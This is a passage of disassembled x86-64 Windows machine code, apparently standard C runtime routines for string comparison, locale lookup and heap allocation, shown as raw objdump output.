   14000caf2:	00 00                	add    %al,(%rax)
   14000caf4:	e3 c9                	jrcxz  0x14000cabf
   14000caf6:	00 00                	add    %al,(%rax)
   14000caf8:	45 33 c0             	xor    %r8d,%r8d
   14000cafb:	e9 00 00 00 00       	jmp    0x14000cb00
   14000cb00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cb05:	57                   	push   %rdi
   14000cb06:	48 83 ec 40          	sub    $0x40,%rsp
   14000cb0a:	48 8b da             	mov    %rdx,%rbx
   14000cb0d:	48 8b f9             	mov    %rcx,%rdi
   14000cb10:	48 85 c9             	test   %rcx,%rcx
   14000cb13:	75 14                	jne    0x14000cb29
   14000cb15:	e8 52 b4 ff ff       	call   0x140007f6c
   14000cb1a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000cb20:	e8 9f b2 ff ff       	call   0x140007dc4
   14000cb25:	33 c0                	xor    %eax,%eax
   14000cb27:	eb 60                	jmp    0x14000cb89
   14000cb29:	48 85 db             	test   %rbx,%rbx
   14000cb2c:	74 e7                	je     0x14000cb15
   14000cb2e:	48 3b fb             	cmp    %rbx,%rdi
   14000cb31:	73 f2                	jae    0x14000cb25
   14000cb33:	49 8b d0             	mov    %r8,%rdx
   14000cb36:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000cb3b:	e8 a8 bf ff ff       	call   0x140008ae8
   14000cb40:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000cb45:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   14000cb49:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   14000cb4d:	74 24                	je     0x14000cb73
   14000cb4f:	48 ff ca             	dec    %rdx
   14000cb52:	48 3b fa             	cmp    %rdx,%rdi
   14000cb55:	77 0a                	ja     0x14000cb61
   14000cb57:	0f b6 02             	movzbl (%rdx),%eax
   14000cb5a:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   14000cb5f:	75 ee                	jne    0x14000cb4f
   14000cb61:	48 8b cb             	mov    %rbx,%rcx
   14000cb64:	48 2b ca             	sub    %rdx,%rcx
   14000cb67:	48 8b d3             	mov    %rbx,%rdx
   14000cb6a:	83 e1 01             	and    $0x1,%ecx
   14000cb6d:	48 2b d1             	sub    %rcx,%rdx
   14000cb70:	48 ff ca             	dec    %rdx
   14000cb73:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000cb78:	74 0c                	je     0x14000cb86
   14000cb7a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000cb7f:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000cb86:	48 8b c2             	mov    %rdx,%rax
   14000cb89:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000cb8e:	48 83 c4 40          	add    $0x40,%rsp
   14000cb92:	5f                   	pop    %rdi
   14000cb93:	c3                   	ret
   14000cb94:	40 55                	rex push %rbp
   14000cb96:	41 54                	push   %r12
   14000cb98:	41 55                	push   %r13
   14000cb9a:	41 56                	push   %r14
   14000cb9c:	41 57                	push   %r15
   14000cb9e:	48 83 ec 60          	sub    $0x60,%rsp
   14000cba2:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000cba7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   14000cbab:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000cbaf:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000cbb3:	48 8b 05 46 14 01 00 	mov    0x11446(%rip),%rax        # 0x14001e000
   14000cbba:	48 33 c5             	xor    %rbp,%rax
   14000cbbd:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000cbc1:	48 63 7d 60          	movslq 0x60(%rbp),%rdi
   14000cbc5:	49 8b f1             	mov    %r9,%rsi
   14000cbc8:	45 8b e0             	mov    %r8d,%r12d
   14000cbcb:	4c 8b ea             	mov    %rdx,%r13
   14000cbce:	48 8b d9             	mov    %rcx,%rbx
   14000cbd1:	85 ff                	test   %edi,%edi
   14000cbd3:	7e 14                	jle    0x14000cbe9
   14000cbd5:	48 8b d7             	mov    %rdi,%rdx
   14000cbd8:	49 8b c9             	mov    %r9,%rcx
   14000cbdb:	e8 b0 14 00 00       	call   0x14000e090
   14000cbe0:	3b c7                	cmp    %edi,%eax
   14000cbe2:	8d 78 01             	lea    0x1(%rax),%edi
   14000cbe5:	7c 02                	jl     0x14000cbe9
   14000cbe7:	8b f8                	mov    %eax,%edi
   14000cbe9:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000cbed:	45 85 f6             	test   %r14d,%r14d
   14000cbf0:	75 07                	jne    0x14000cbf9
   14000cbf2:	48 8b 03             	mov    (%rbx),%rax
   14000cbf5:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000cbf9:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000cbff:	44 8b cf             	mov    %edi,%r9d
   14000cc02:	4c 8b c6             	mov    %rsi,%r8
   14000cc05:	41 8b ce             	mov    %r14d,%ecx
   14000cc08:	1b d2                	sbb    %edx,%edx
   14000cc0a:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000cc0f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000cc15:	83 e2 08             	and    $0x8,%edx
   14000cc18:	ff c2                	inc    %edx
   14000cc1a:	e8 a9 cd ff ff       	call   0x1400099c8
   14000cc1f:	33 d2                	xor    %edx,%edx
   14000cc21:	4c 63 f8             	movslq %eax,%r15
   14000cc24:	85 c0                	test   %eax,%eax
   14000cc26:	0f 84 73 02 00 00    	je     0x14000ce9f
   14000cc2c:	49 8b c7             	mov    %r15,%rax
   14000cc2f:	48 03 c0             	add    %rax,%rax
   14000cc32:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000cc36:	48 3b c1             	cmp    %rcx,%rax
   14000cc39:	48 1b c0             	sbb    %rax,%rax
   14000cc3c:	48 23 c1             	and    %rcx,%rax
   14000cc3f:	0f 84 3d 02 00 00    	je     0x14000ce82
   14000cc45:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000cc4c:	ff ff 0f 
   14000cc4f:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   14000cc55:	77 31                	ja     0x14000cc88
   14000cc57:	48 8d 48 0f          	lea    0xf(%rax),%rcx
   14000cc5b:	48 3b c8             	cmp    %rax,%rcx
   14000cc5e:	77 03                	ja     0x14000cc63
   14000cc60:	49 8b c8             	mov    %r8,%rcx
   14000cc63:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000cc67:	48 8b c1             	mov    %rcx,%rax
   14000cc6a:	e8 a1 1c 00 00       	call   0x14000e910
   14000cc6f:	48 2b e1             	sub    %rcx,%rsp
   14000cc72:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000cc77:	48 85 db             	test   %rbx,%rbx
   14000cc7a:	0f 84 05 02 00 00    	je     0x14000ce85
   14000cc80:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000cc86:	eb 18                	jmp    0x14000cca0
   14000cc88:	48 8b c8             	mov    %rax,%rcx
   14000cc8b:	e8 50 d9 ff ff       	call   0x14000a5e0
   14000cc90:	33 d2                	xor    %edx,%edx
   14000cc92:	48 8b d8             	mov    %rax,%rbx
   14000cc95:	48 85 c0             	test   %rax,%rax
   14000cc98:	74 0a                	je     0x14000cca4
   14000cc9a:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000cca0:	48 83 c3 10          	add    $0x10,%rbx
   14000cca4:	48 85 db             	test   %rbx,%rbx
   14000cca7:	0f 84 d8 01 00 00    	je     0x14000ce85
   14000ccad:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000ccb2:	44 8b cf             	mov    %edi,%r9d
   14000ccb5:	4c 8b c6             	mov    %rsi,%r8
   14000ccb8:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000ccbd:	ba 01 00 00 00       	mov    $0x1,%edx
   14000ccc2:	41 8b ce             	mov    %r14d,%ecx
   14000ccc5:	e8 fe cc ff ff       	call   0x1400099c8
   14000ccca:	33 d2                	xor    %edx,%edx
   14000cccc:	85 c0                	test   %eax,%eax
   14000ccce:	0f 84 b1 01 00 00    	je     0x14000ce85
   14000ccd4:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000ccd9:	45 8b cf             	mov    %r15d,%r9d
   14000ccdc:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000cce1:	4c 8b c3             	mov    %rbx,%r8
   14000cce4:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000cce9:	49 8b cd             	mov    %r13,%rcx
   14000ccec:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000ccf0:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000ccf5:	41 8b d4             	mov    %r12d,%edx
   14000ccf8:	e8 a3 e1 ff ff       	call   0x14000aea0
   14000ccfd:	33 d2                	xor    %edx,%edx
   14000ccff:	48 63 f0             	movslq %eax,%rsi
   14000cd02:	85 c0                	test   %eax,%eax
   14000cd04:	0f 84 7b 01 00 00    	je     0x14000ce85
   14000cd0a:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   14000cd10:	45 85 e0             	test   %r12d,%r8d
   14000cd13:	74 51                	je     0x14000cd66
   14000cd15:	8b 45 70             	mov    0x70(%rbp),%eax
   14000cd18:	85 c0                	test   %eax,%eax
   14000cd1a:	0f 84 6c 01 00 00    	je     0x14000ce8c
   14000cd20:	3b f0                	cmp    %eax,%esi
   14000cd22:	0f 8f 5d 01 00 00    	jg     0x14000ce85
   14000cd28:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000cd2d:	45 8b cf             	mov    %r15d,%r9d
   14000cd30:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000cd35:	4c 8b c3             	mov    %rbx,%r8
   14000cd38:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000cd3d:	49 8b cd             	mov    %r13,%rcx
   14000cd40:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000cd44:	41 8b d4             	mov    %r12d,%edx
   14000cd47:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000cd4b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000cd50:	e8 4b e1 ff ff       	call   0x14000aea0
   14000cd55:	33 d2                	xor    %edx,%edx
   14000cd57:	8b f0                	mov    %eax,%esi
   14000cd59:	85 c0                	test   %eax,%eax
   14000cd5b:	0f 85 2b 01 00 00    	jne    0x14000ce8c
   14000cd61:	e9 1f 01 00 00       	jmp    0x14000ce85
   14000cd66:	48 8b ce             	mov    %rsi,%rcx
   14000cd69:	48 03 c9             	add    %rcx,%rcx
   14000cd6c:	48 8d 41 10          	lea    0x10(%rcx),%rax
   14000cd70:	48 3b c8             	cmp    %rax,%rcx
   14000cd73:	48 1b c9             	sbb    %rcx,%rcx
   14000cd76:	48 23 c8             	and    %rax,%rcx
   14000cd79:	0f 84 e6 00 00 00    	je     0x14000ce65
   14000cd7f:	49 3b c8             	cmp    %r8,%rcx
   14000cd82:	77 35                	ja     0x14000cdb9
   14000cd84:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000cd88:	48 3b c1             	cmp    %rcx,%rax
   14000cd8b:	77 0a                	ja     0x14000cd97
   14000cd8d:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000cd94:	ff ff 0f 
   14000cd97:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000cd9b:	e8 70 1b 00 00       	call   0x14000e910
   14000cda0:	48 2b e0             	sub    %rax,%rsp
   14000cda3:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   14000cda8:	48 85 ff             	test   %rdi,%rdi
   14000cdab:	0f 84 cd 00 00 00    	je     0x14000ce7e
   14000cdb1:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000cdb7:	eb 15                	jmp    0x14000cdce
   14000cdb9:	e8 22 d8 ff ff       	call   0x14000a5e0
   14000cdbe:	33 d2                	xor    %edx,%edx
   14000cdc0:	48 8b f8             	mov    %rax,%rdi
   14000cdc3:	48 85 c0             	test   %rax,%rax
   14000cdc6:	74 0a                	je     0x14000cdd2
   14000cdc8:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000cdce:	48 83 c7 10          	add    $0x10,%rdi
   14000cdd2:	48 85 ff             	test   %rdi,%rdi
   14000cdd5:	0f 84 a3 00 00 00    	je     0x14000ce7e
   14000cddb:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000cde0:	45 8b cf             	mov    %r15d,%r9d
   14000cde3:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000cde8:	4c 8b c3             	mov    %rbx,%r8
   14000cdeb:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000cdf0:	49 8b cd             	mov    %r13,%rcx
   14000cdf3:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000cdf7:	41 8b d4             	mov    %r12d,%edx
   14000cdfa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000cdff:	e8 9c e0 ff ff       	call   0x14000aea0
   14000ce04:	33 d2                	xor    %edx,%edx
   14000ce06:	85 c0                	test   %eax,%eax
   14000ce08:	74 5e                	je     0x14000ce68
   14000ce0a:	8b 45 70             	mov    0x70(%rbp),%eax
   14000ce0d:	44 8b ce             	mov    %esi,%r9d
   14000ce10:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000ce15:	4c 8b c7             	mov    %rdi,%r8
   14000ce18:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   14000ce1d:	41 8b ce             	mov    %r14d,%ecx
   14000ce20:	85 c0                	test   %eax,%eax
   14000ce22:	75 16                	jne    0x14000ce3a
   14000ce24:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000ce28:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000ce2d:	e8 26 cc ff ff       	call   0x140009a58
   14000ce32:	8b f0                	mov    %eax,%esi
   14000ce34:	85 c0                	test   %eax,%eax
   14000ce36:	75 1a                	jne    0x14000ce52
   14000ce38:	eb 2e                	jmp    0x14000ce68
   14000ce3a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000ce3e:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000ce42:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ce47:	e8 0c cc ff ff       	call   0x140009a58
   14000ce4c:	8b f0                	mov    %eax,%esi
   14000ce4e:	85 c0                	test   %eax,%eax
   14000ce50:	74 1b                	je     0x14000ce6d
   14000ce52:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000ce56:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000ce5c:	75 2e                	jne    0x14000ce8c
   14000ce5e:	e8 ad b1 ff ff       	call   0x140008010
   14000ce63:	eb 27                	jmp    0x14000ce8c
   14000ce65:	48 8b fa             	mov    %rdx,%rdi
   14000ce68:	48 85 ff             	test   %rdi,%rdi
   14000ce6b:	74 11                	je     0x14000ce7e
   14000ce6d:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000ce71:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000ce77:	75 05                	jne    0x14000ce7e
   14000ce79:	e8 92 b1 ff ff       	call   0x140008010
   14000ce7e:	33 f6                	xor    %esi,%esi
   14000ce80:	eb 0a                	jmp    0x14000ce8c
   14000ce82:	48 8b da             	mov    %rdx,%rbx
   14000ce85:	8b f2                	mov    %edx,%esi
   14000ce87:	48 85 db             	test   %rbx,%rbx
   14000ce8a:	74 11                	je     0x14000ce9d
   14000ce8c:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000ce90:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000ce96:	75 05                	jne    0x14000ce9d
   14000ce98:	e8 73 b1 ff ff       	call   0x140008010
   14000ce9d:	8b c6                	mov    %esi,%eax
   14000ce9f:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000cea3:	48 33 cd             	xor    %rbp,%rcx
   14000cea6:	e8 65 62 ff ff       	call   0x140003110
   14000ceab:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000ceaf:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000ceb3:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000ceb7:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000cebb:	41 5f                	pop    %r15
   14000cebd:	41 5e                	pop    %r14
   14000cebf:	41 5d                	pop    %r13
   14000cec1:	41 5c                	pop    %r12
   14000cec3:	5d                   	pop    %rbp
   14000cec4:	c3                   	ret
   14000cec5:	cc                   	int3
   14000cec6:	cc                   	int3
   14000cec7:	cc                   	int3
   14000cec8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cecd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000ced2:	57                   	push   %rdi
   14000ced3:	48 83 ec 70          	sub    $0x70,%rsp
   14000ced7:	48 8b f2             	mov    %rdx,%rsi
   14000ceda:	49 8b d9             	mov    %r9,%rbx
   14000cedd:	48 8b d1             	mov    %rcx,%rdx
   14000cee0:	41 8b f8             	mov    %r8d,%edi
   14000cee3:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000cee8:	e8 fb bb ff ff       	call   0x140008ae8
   14000ceed:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000cef4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000cef9:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000cefd:	4c 8b cb             	mov    %rbx,%r9
   14000cf00:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000cf07:	44 8b c7             	mov    %edi,%r8d
   14000cf0a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000cf0e:	48 8b d6             	mov    %rsi,%rdx
   14000cf11:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000cf18:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000cf1c:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000cf23:	00 
   14000cf24:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000cf29:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000cf30:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000cf34:	e8 5b fc ff ff       	call   0x14000cb94
   14000cf39:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000cf3e:	74 0c                	je     0x14000cf4c
   14000cf40:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000cf45:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000cf4c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000cf51:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000cf55:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000cf59:	49 8b e3             	mov    %r11,%rsp
   14000cf5c:	5f                   	pop    %rdi
   14000cf5d:	c3                   	ret
   14000cf5e:	cc                   	int3
   14000cf5f:	cc                   	int3
   14000cf60:	48 83 ec 28          	sub    $0x28,%rsp
   14000cf64:	e8 6b c6 ff ff       	call   0x1400095d4
   14000cf69:	0f b6 c0             	movzbl %al,%eax
   14000cf6c:	83 f0 01             	xor    $0x1,%eax
   14000cf6f:	48 83 c4 28          	add    $0x28,%rsp
   14000cf73:	c3                   	ret
   14000cf74:	cc                   	int3
   14000cf75:	cc                   	int3
   14000cf76:	cc                   	int3
   14000cf77:	cc                   	int3
   14000cf78:	cc                   	int3
   14000cf79:	cc                   	int3
   14000cf7a:	cc                   	int3
   14000cf7b:	cc                   	int3
   14000cf7c:	cc                   	int3
   14000cf7d:	cc                   	int3
   14000cf7e:	cc                   	int3
   14000cf7f:	cc                   	int3
   14000cf80:	4d 8b c8             	mov    %r8,%r9
   14000cf83:	4c 8b da             	mov    %rdx,%r11
   14000cf86:	4c 8b d1             	mov    %rcx,%r10
   14000cf89:	4d 85 c0             	test   %r8,%r8
   14000cf8c:	75 12                	jne    0x14000cfa0
   14000cf8e:	33 c0                	xor    %eax,%eax
   14000cf90:	c3                   	ret
   14000cf91:	0f 1f 40 00          	nopl   0x0(%rax)
   14000cf95:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000cf9c:	00 00 00 00 
   14000cfa0:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000cfa4:	4d 8d 52 02          	lea    0x2(%r10),%r10
   14000cfa8:	45 0f b7 03          	movzwl (%r11),%r8d
   14000cfac:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000cfb0:	41 3b c8             	cmp    %r8d,%ecx
   14000cfb3:	74 20                	je     0x14000cfd5
   14000cfb5:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000cfb8:	83 f8 19             	cmp    $0x19,%eax
   14000cfbb:	8d 51 20             	lea    0x20(%rcx),%edx
   14000cfbe:	41 8d 40 bf          	lea    -0x41(%r8),%eax
   14000cfc2:	0f 47 d1             	cmova  %ecx,%edx
   14000cfc5:	83 f8 19             	cmp    $0x19,%eax
   14000cfc8:	8b ca                	mov    %edx,%ecx
   14000cfca:	41 8d 50 20          	lea    0x20(%r8),%edx
   14000cfce:	41 0f 47 d0          	cmova  %r8d,%edx
   14000cfd2:	44 8b c2             	mov    %edx,%r8d
   14000cfd5:	8b c1                	mov    %ecx,%eax
   14000cfd7:	41 2b c0             	sub    %r8d,%eax
   14000cfda:	75 0a                	jne    0x14000cfe6
   14000cfdc:	85 c9                	test   %ecx,%ecx
   14000cfde:	74 06                	je     0x14000cfe6
   14000cfe0:	49 83 e9 01          	sub    $0x1,%r9
   14000cfe4:	75 ba                	jne    0x14000cfa0
   14000cfe6:	c3                   	ret
   14000cfe7:	cc                   	int3
   14000cfe8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cfed:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000cff2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000cff7:	57                   	push   %rdi
   14000cff8:	41 56                	push   %r14
   14000cffa:	41 57                	push   %r15
   14000cffc:	48 83 ec 20          	sub    $0x20,%rsp
   14000d000:	48 8b f9             	mov    %rcx,%rdi
   14000d003:	48 85 c9             	test   %rcx,%rcx
   14000d006:	74 4b                	je     0x14000d053
   14000d008:	33 db                	xor    %ebx,%ebx
   14000d00a:	4c 8d 3d ef 2f ff ff 	lea    -0xd011(%rip),%r15        # 0x140000000
   14000d011:	be e3 00 00 00       	mov    $0xe3,%esi
   14000d016:	8d 04 1e             	lea    (%rsi,%rbx,1),%eax
   14000d019:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000d01f:	99                   	cltd
   14000d020:	48 8b cf             	mov    %rdi,%rcx
   14000d023:	2b c2                	sub    %edx,%eax
   14000d025:	d1 f8                	sar    $1,%eax
   14000d027:	48 63 e8             	movslq %eax,%rbp
   14000d02a:	4c 8b f5             	mov    %rbp,%r14
   14000d02d:	4d 03 f6             	add    %r14,%r14
   14000d030:	4b 8b 94 f7 30 4f 01 	mov    0x14f30(%r15,%r14,8),%rdx
   14000d037:	00 
   14000d038:	e8 43 ff ff ff       	call   0x14000cf80
   14000d03d:	85 c0                	test   %eax,%eax
   14000d03f:	74 2d                	je     0x14000d06e
   14000d041:	8d 4d ff             	lea    -0x1(%rbp),%ecx
   14000d044:	0f 49 ce             	cmovns %esi,%ecx
   14000d047:	8b f1                	mov    %ecx,%esi
   14000d049:	8d 4d 01             	lea    0x1(%rbp),%ecx
   14000d04c:	0f 49 d9             	cmovns %ecx,%ebx
   14000d04f:	3b de                	cmp    %esi,%ebx
   14000d051:	7e c3                	jle    0x14000d016
   14000d053:	33 c0                	xor    %eax,%eax
   14000d055:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000d05a:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000d05f:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000d064:	48 83 c4 20          	add    $0x20,%rsp
   14000d068:	41 5f                	pop    %r15
   14000d06a:	41 5e                	pop    %r14
   14000d06c:	5f                   	pop    %rdi
   14000d06d:	c3                   	ret
   14000d06e:	4b 63 84 f7 38 4f 01 	movslq 0x14f38(%r15,%r14,8),%rax
   14000d075:	00 
   14000d076:	85 c0                	test   %eax,%eax
   14000d078:	78 d9                	js     0x14000d053
   14000d07a:	48 3d e4 00 00 00    	cmp    $0xe4,%rax
   14000d080:	73 d1                	jae    0x14000d053
   14000d082:	48 03 c0             	add    %rax,%rax
   14000d085:	41 8b 84 c7 d0 34 01 	mov    0x134d0(%r15,%rax,8),%eax
   14000d08c:	00 
   14000d08d:	eb c6                	jmp    0x14000d055
   14000d08f:	cc                   	int3
   14000d090:	48 83 ec 28          	sub    $0x28,%rsp
   14000d094:	48 85 c9             	test   %rcx,%rcx
   14000d097:	75 19                	jne    0x14000d0b2
   14000d099:	e8 ce ae ff ff       	call   0x140007f6c
   14000d09e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000d0a4:	e8 1b ad ff ff       	call   0x140007dc4
   14000d0a9:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000d0ad:	48 83 c4 28          	add    $0x28,%rsp
   14000d0b1:	c3                   	ret
   14000d0b2:	4c 8b c1             	mov    %rcx,%r8
   14000d0b5:	33 d2                	xor    %edx,%edx
   14000d0b7:	48 8b 0d 82 25 01 00 	mov    0x12582(%rip),%rcx        # 0x14001f640
   14000d0be:	48 83 c4 28          	add    $0x28,%rsp
   14000d0c2:	48 ff 25 57 31 00 00 	rex.W jmp *0x3157(%rip)        # 0x140010220
   14000d0c9:	cc                   	int3
   14000d0ca:	cc                   	int3
   14000d0cb:	cc                   	int3
   14000d0cc:	cc                   	int3
   14000d0cd:	cc                   	int3
   14000d0ce:	cc                   	int3
   14000d0cf:	cc                   	int3
   14000d0d0:	e9 bb ff ff ff       	jmp    0x14000d090
   14000d0d5:	cc                   	int3
   14000d0d6:	cc                   	int3
   14000d0d7:	cc                   	int3
   14000d0d8:	cc                   	int3
   14000d0d9:	cc                   	int3
   14000d0da:	cc                   	int3
   14000d0db:	cc                   	int3
   14000d0dc:	cc                   	int3
   14000d0dd:	cc                   	int3
   14000d0de:	cc                   	int3
   14000d0df:	cc                   	int3
   14000d0e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d0e5:	57                   	push   %rdi
   14000d0e6:	48 83 ec 20          	sub    $0x20,%rsp
   14000d0ea:	48 8b da             	mov    %rdx,%rbx
   14000d0ed:	48 8b f9             	mov    %rcx,%rdi
   14000d0f0:	48 85 c9             	test   %rcx,%rcx
   14000d0f3:	75 0a                	jne    0x14000d0ff
   14000d0f5:	48 8b ca             	mov    %rdx,%rcx
   14000d0f8:	e8 e3 d4 ff ff       	call   0x14000a5e0
   14000d0fd:	eb 1f                	jmp    0x14000d11e
   14000d0ff:	48 85 db             	test   %rbx,%rbx
   14000d102:	75 07                	jne    0x14000d10b
   14000d104:	e8 07 af ff ff       	call   0x140008010
   14000d109:	eb 11                	jmp    0x14000d11c
   14000d10b:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000d10f:	76 2d                	jbe    0x14000d13e
   14000d111:	e8 56 ae ff ff       	call   0x140007f6c
   14000d116:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000d11c:	33 c0                	xor    %eax,%eax
   14000d11e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d123:	48 83 c4 20          	add    $0x20,%rsp
   14000d127:	5f                   	pop    %rdi
   14000d128:	c3                   	ret
   14000d129:	e8 42 9b ff ff       	call   0x140006c70
   14000d12e:	85 c0                	test   %eax,%eax
   14000d130:	74 df                	je     0x14000d111
   14000d132:	48 8b cb             	mov    %rbx,%rcx
   14000d135:	e8 56 e1 ff ff       	call   0x14000b290
   14000d13a:	85 c0                	test   %eax,%eax
   14000d13c:	74 d3                	je     0x14000d111
   14000d13e:	48 8b 0d fb 24 01 00 	mov    0x124fb(%rip),%rcx        # 0x14001f640
   14000d145:	4c 8b cb             	mov    %rbx,%r9
   14000d148:	4c 8b c7             	mov    %rdi,%r8
   14000d14b:	33 d2                	xor    %edx,%edx
   14000d14d:	ff 15 f5 2e 00 00    	call   *0x2ef5(%rip)        # 0x140010048
   14000d153:	48 85 c0             	test   %rax,%rax
   14000d156:	74 d1                	je     0x14000d129
   14000d158:	eb c4                	jmp    0x14000d11e
   14000d15a:	cc                   	int3
   14000d15b:	cc                   	int3
   14000d15c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d161:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000d166:	57                   	push   %rdi
   14000d167:	48 83 ec 20          	sub    $0x20,%rsp
   14000d16b:	49 8b f9             	mov    %r9,%rdi
   14000d16e:	49 8b d8             	mov    %r8,%rbx
   14000d171:	8b 0a                	mov    (%rdx),%ecx
   14000d173:	e8 8c cd ff ff       	call   0x140009f04
   14000d178:	90                   	nop
   14000d179:	48 8b 03             	mov    (%rbx),%rax
   14000d17c:	48 63 08             	movslq (%rax),%rcx
   14000d17f:	48 8b d1             	mov    %rcx,%rdx
   14000d182:	48 8b c1             	mov    %rcx,%rax
   14000d185:	48 c1 f8 06          	sar    $0x6,%rax
   14000d189:	4c 8d 05 e0 1f 01 00 	lea    0x11fe0(%rip),%r8        # 0x14001f170
